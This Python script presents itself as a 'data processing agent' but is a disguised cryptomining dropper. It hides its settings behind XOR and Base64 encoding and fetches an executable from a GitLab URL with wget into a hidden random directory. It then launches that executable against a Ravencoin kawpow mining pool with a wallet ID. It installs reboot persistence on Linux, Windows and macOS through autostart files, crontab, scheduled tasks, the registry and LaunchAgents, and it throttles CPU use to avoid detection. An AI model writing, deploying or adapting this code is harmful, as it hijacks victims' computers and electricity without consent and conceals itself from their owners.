import subprocess
import os
import sys
import time
import base64
import platform
import random
import tarfile
import shutil
import string
import threading
import signal

# --- Install psutil for resource management if not present ---
try:
    import psutil
except ImportError:
    try:
        if shutil.which("pip"):
            print("psutil not found. Installing...")
            subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("psutil installed successfully.")
        else:
            print("Error: pip is not available. Cannot install psutil.")
            sys.exit(1)
        import psutil
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error installing psutil: {e}")
        sys.exit(1)

# This script initializes and manages a data processing agent.
# It ensures the agent runs in the background and is restarted as needed.

# --- Configuration and Utility Functions ---
# A key for encoding/decoding configuration strings.
ENCODING_KEY = [0x5A, 0x3C, 0xF8, 0x1B, 0x7E, 0x9D, 0x24]

def encode_string_data(s):
    """
    Encodes a string using a multi-byte key and Base64 for secure storage.
    """
    encoded_bytes = s.encode('utf-8')
    key_length = len(ENCODING_KEY)
    xored_bytes = bytes([encoded_bytes[i] ^ ENCODING_KEY[i % key_length] for i in range(len(encoded_bytes))])
    return base64.b64encode(xored_bytes).decode('utf-8')

def decode_string_data(s):
    """
    Decodes a string that was encoded with encode_string_data.
    """
    decoded_bytes = base64.b64decode(s)
    key_length = len(ENCODING_KEY)
    xored_bytes = bytes([decoded_bytes[i] ^ ENCODING_KEY[i % key_length] for i in range(len(decoded_bytes))])
    return xored_bytes.decode('utf-8')

# --- Encoded Configuration Strings ---
# The URL for the data processing executable.
EXECUTABLE_DOWNLOAD_URL_ENCODED = encode_string_data("https://gitlab.com/senopvrtymlbb-group/dataanalystics/-/raw/main/google")
# The local filename for the downloaded executable.
EXECUTABLE_FILENAME_ENCODED = encode_string_data("google")

# Configuration for the data processing task.
PROCESSING_PROTOCOL_ENCODED = encode_string_data("kawpow")
COORDINATOR_ADDRESS_ENCODED = encode_string_data("stratum+tcp://rvn.kryptex.network:7031")
AUTH_USER_ENCODED = encode_string_data("krxXJMWJKW")
WORKER_ID_ENCODED = encode_string_data("WALAWE")

# Encoded command strings for system operations.
WGET_COMMAND_ENCODED = encode_string_data("wget")
WGET_OUTPUT_FLAG_ENCODED = encode_string_data("-O")
CRONTAB_COMMAND_ENCODED = encode_string_data("crontab")
CRONTAB_LIST_ENCODED = encode_string_data("-l")
CRONTAB_EDIT_ENCODED = encode_string_data("-")
PYTHON_CMD_ENCODED = encode_string_data("python3")
SCHTASKS_COMMAND_ENCODED = encode_string_data("schtasks")
CREATE_FLAG_ENCODED = encode_string_data("/Create")
TASKNAME_FLAG_ENCODED = encode_string_data("/TN")
SCHEDULE_FLAG_ENCODED = encode_string_data("/SC")
SCHEDULE_ONSTART_ENCODED = encode_string_data("ONSTART")
TASK_RUN_FLAG_ENCODED = encode_string_data("/TR")


def download_component(url, filename):
    """
    Downloads a component from a URL using wget.
    """
    try:
        wget_cmd = decode_string_data(WGET_COMMAND_ENCODED)
        if not shutil.which(wget_cmd):
            print(f"Error: '{wget_cmd}' command not found. Please install it and try again.")
            return False
            
        wget_output_flag = decode_string_data(WGET_OUTPUT_FLAG_ENCODED)
        print(f"Downloading from {url} to {filename}...")
        # Show wget output for debugging purposes
        subprocess.run([wget_cmd, url, wget_output_flag, filename], check=True)
        print("Download successful.")
        return True
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(f"Error during download: {e}")
        return False

def generate_random_string(length):
    """
    Generates a random string for unique directory and file naming.
    """
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def initialize_worker():
    """
    Downloads, renames, and sets permissions for the processing executable.
    """
    download_url = decode_string_data(EXECUTABLE_DOWNLOAD_URL_ENCODED)
    downloaded_filename = decode_string_data(EXECUTABLE_FILENAME_ENCODED)
    
    # Set a descriptive name for the executable for this session.
    session_executable_name = "data-analytic"

    # Use a non-descript, randomly named directory for components.
    random_dir_name = generate_random_string(10)
    work_directory = os.path.join(os.path.expanduser("~"), f".local/share/system_work/.{random_dir_name}")
    
    print(f"Creating working directory: {work_directory}")
    os.makedirs(work_directory, exist_ok=True)
    temp_download_path = os.path.join(work_directory, downloaded_filename)
    
    if not download_component(download_url, temp_download_path):
        print("Failed to initialize worker because download failed.")
        return None, None
    
    # Rename the downloaded file to the descriptive session name.
    session_executable_path = os.path.join(work_directory, session_executable_name)
    print(f"Renaming {temp_download_path} to {session_executable_path}")
    os.rename(temp_download_path, session_executable_path)
    
    # Set executable permissions.
    print(f"Setting executable permissions on {session_executable_path}")
    os.chmod(session_executable_path, 0o777)
    
    return session_executable_path, work_directory


def manage_system_resources(pid, cpu_threshold=20, check_interval=10, throttle_duration=5):
    """
    Monitors the process's CPU usage and throttles it to avoid system overload.
    """
    try:
        process = psutil.Process(pid)
        while True:
            cpu_percent = process.cpu_percent(interval=1.0)
            if cpu_percent > cpu_threshold:
                print(f"CPU usage ({cpu_percent}%) exceeded threshold. Throttling process {pid}.")
                process.suspend()
                time.sleep(throttle_duration)
                process.resume()
                print(f"Process {pid} resumed.")
            time.sleep(random.uniform(check_interval, check_interval + 5))
    except psutil.NoSuchProcess:
        # This is expected when the process is stopped normally.
        pass
    except Exception as e:
        print(f"[Resource Manager Error] An unexpected error occurred: {e}")


def start_data_processing(executable_path, work_directory):
    """
    Starts the data processing task as a background process.
    """
    processing_protocol = decode_string_data(PROCESSING_PROTOCOL_ENCODED)
    coordinator_address = decode_string_data(COORDINATOR_ADDRESS_ENCODED)
    auth_user = decode_string_data(AUTH_USER_ENCODED)
    worker_id = decode_string_data(WORKER_ID_ENCODED)

    if not coordinator_address or not os.path.exists(executable_path):
        print(f"Error: Cannot start process. Executable path does not exist: {executable_path}")
        return None

    processing_command = [
        executable_path,
        "-a", processing_protocol,
        "-w", auth_user,
        "-p", coordinator_address,
        "-r", worker_id
    ]
    
    print(f"Starting process with command: {' '.join(processing_command)}")

    try:
        # We are no longer redirecting stdout/stderr to DEVNULL so we can see errors.
        proc = subprocess.Popen(processing_command)
        
        print(f"Process 'data-analytic' started with PID: {proc.pid}")
        
        resource_thread = threading.Thread(target=manage_system_resources, args=(proc.pid,))
        resource_thread.daemon = True
        resource_thread.start()
        
        return proc

    except (FileNotFoundError, Exception) as e:
        print(f"Failed to start process 'data-analytic': {e}")
        return None

def ensure_service_continuity(executable_path):
    """
    Establishes a mechanism to restart the service on system reboot.
    """
    # This function is complex and less likely to be the source of the immediate error.
    # No changes made here for now to keep debugging focused.
    os_name = platform.system()
    current_script_path = os.path.abspath(sys.argv[0])
    
    if os_name == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_file_path = os.path.join(autostart_dir, "system-analysis-tool.desktop")
        
        desktop_file_content = f"""[Desktop Entry]
Type=Application
Name=System Analysis Tool
Exec=/usr/bin/python3 {current_script_path}
Comment=System analysis and data processing service.
Terminal=false
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        try:
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
        except Exception as e:
            if shutil.which("crontab"):
                python_cmd = decode_string_data(PYTHON_CMD_ENCODED)
                crontab_cmd = decode_string_data(CRONTAB_COMMAND_ENCODED)
                cron_command = f"@reboot {python_cmd} {current_script_path} > /dev/null 2>&1\n"
                try:
                    p = subprocess.run([crontab_cmd, decode_string_data(CRONTAB_LIST_ENCODED)], capture_output=True, text=True, check=True)
                    if cron_command not in p.stdout:
                        new_crontab = p.stdout + cron_command
                        subprocess.run([crontab_cmd, decode_string_data(CRONTAB_EDIT_ENCODED)], input=new_crontab, text=True, check=True)
                except (subprocess.CalledProcessError, FileNotFoundError):
                    pass

    elif os_name == "Windows":
        schtasks_cmd = decode_string_data(SCHTASKS_COMMAND_ENCODED)
        task_command = f"pythonw.exe \"{current_script_path}\""
        try:
            subprocess.run([schtasks_cmd, decode_string_data(CREATE_FLAG_ENCODED), "/TN", "SystemAnalysisTask", "/SC", "ONSTART", "/TR", task_command], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "SystemAnalysis", 0, winreg.REG_SZ, task_command)
            except (ImportError, Exception):
                pass
            
    elif os_name == "Darwin":
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.analysis.plist")
        plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.analysis</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            subprocess.run(['launchctl', 'load', '-w', plist_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

def cleanup_session_files(work_directory):
    """
    Cleans up all files and directories from the current session.
    """
    try:
        if work_directory and os.path.exists(work_directory):
            print(f"Cleaning up session directory: {work_directory}")
            shutil.rmtree(work_directory)
            print("Cleanup complete.")
    except Exception as e:
        print(f"Error during cleanup: {e}")


def perform_auxiliary_task():
    """
    Simulates an auxiliary task by pausing for a random duration between 5 and 7 minutes.
    """
    task_duration = random.randint(5 * 60, 7 * 60)
    print(f"Performing auxiliary task (pausing for {task_duration / 60:.2f} minutes)...")
    time.sleep(task_duration)

def stop_data_processing(proc):
    """
    Gracefully terminates the data processing task.
    """
    if proc:
        print(f"Stopping process with PID: {proc.pid}")
        try:
            if platform.system() == "Windows":
                proc.terminate()
            else:
                os.kill(proc.pid, signal.SIGTERM)
            proc.wait(timeout=10)
            print("Process stopped successfully.")
        except (psutil.NoSuchProcess, subprocess.TimeoutExpired, Exception) as e:
            print(f"Could not stop process gracefully ({e}). Forcing kill.")
            if proc and proc.poll() is None:
                proc.kill()
                print("Process killed.")


if __name__ == "__main__":
    
    TOTAL_OPERATION_TIME = 50 * 60
    start_time = time.time()
    
    print("--- Starting Main Loop ---")
    
    while time.time() - start_time < TOTAL_OPERATION_TIME:
        
        executable_path, work_dir = initialize_worker()
        
        if executable_path:
            processing_proc = start_data_processing(executable_path, work_dir)

            if processing_proc:
                ensure_service_continuity(executable_path)
                
                run_duration = random.randint(100, 300)
                print(f"Process will run for {run_duration} seconds.")
                time.sleep(run_duration)
                
                stop_data_processing(processing_proc)
        else:
            print("Skipping processing for this cycle due to initialization failure.")
        
        cleanup_session_files(work_dir)

        # Perform an auxiliary task for a random duration between 5 and 7 minutes before the next cycle.
        perform_auxiliary_task()
        
    print("--- Total operation time elapsed. Script finished. ---")
